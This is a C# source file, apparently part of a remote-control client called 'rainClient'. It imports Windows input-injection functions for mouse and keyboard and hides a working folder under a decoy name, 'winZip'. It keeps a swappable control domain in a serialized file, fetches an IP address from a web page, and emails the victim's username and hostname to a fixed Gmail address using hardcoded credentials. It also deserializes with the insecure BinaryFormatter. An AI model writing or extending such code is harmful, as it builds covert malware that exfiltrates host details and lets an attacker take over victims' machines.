using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;

namespace rainClient
{
    static class GO
    {
        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

        public static string puth = String.Format("{0}\\UserProfile\\winZip", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
        public static string defaultDomain = <domain>"http://defaultDomain.com"</domain>;
        private static object locker = new object();

        static GO()
        {
            string pputh = String.Format("{0}\\UserProfile\\winZip", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
            Directory.CreateDirectory(pputh);
        }

        public static string parceIP(string webSite, string pattern = null)
        {
            try
            {
                Stream stream = new WebClient().OpenRead(webSite);
                StreamReader sr = new StreamReader(stream);
                string str;
                string newLine;
                Regex regex = pattern == null ? new Regex("<myIP>(.*)</myIP>") : new Regex(pattern);
                while ((newLine = sr.ReadLine()) != null)
                {
                    Match match = regex.Match(newLine);
                    str = match.Groups[1].ToString();
                    if (str != "")
                    {
                        stream.Close();
                        sr.Close();
                        return str;
                    }
                }
                stream.Close();
                sr.Close();
            }
            catch
            {}
            return null;
        }
           
        public static void writeNewDomein(string domein)
        {
            if (File.Exists(puth + "\\chcpcd.bin"))
                File.Delete(puth + "\\chcpcd.bin");
            FileStream fs = new FileStream(puth + "\\chcpcd.bin", FileMode.OpenOrCreate);
            new BinaryFormatter().Serialize(fs, domein);
            fs.Close();
        }

        public static string getDomain()
        {
            lock (locker)
            {
                if (File.Exists(puth + "\\chcpcd.bin"))
                {
                    string str = null;
                    using (FileStream fS = new FileStream(puth + "\\chcpcd.bin", FileMode.Open))
                    {
                        str = (string)new BinaryFormatter().Deserialize(fS);
                    }
                    return str;
                }
            }
            return defaultDomain;
        }     

        public static void sendMail(string message)
        {            
            new SmtpClient("smtp.gmail.com", 587)
            {
                Credentials = new NetworkCredential("mail@gmail.com", "mailpaswd"),
                EnableSsl = true
            }.Send(new MailMessage(new MailAddress("mail@gmail.com", "Naruto"), new MailAddress("TOmail@gmail.com"))
            {
                Subject = "Hi",
                Body = String.Format("<h2>UserName {0} </h2><h2>HostName {1}</h2><h2>Message {2}</h2>", Environment.UserName, Dns.GetHostName(), message),
                IsBodyHtml = true
            }); 
        }
    }
}
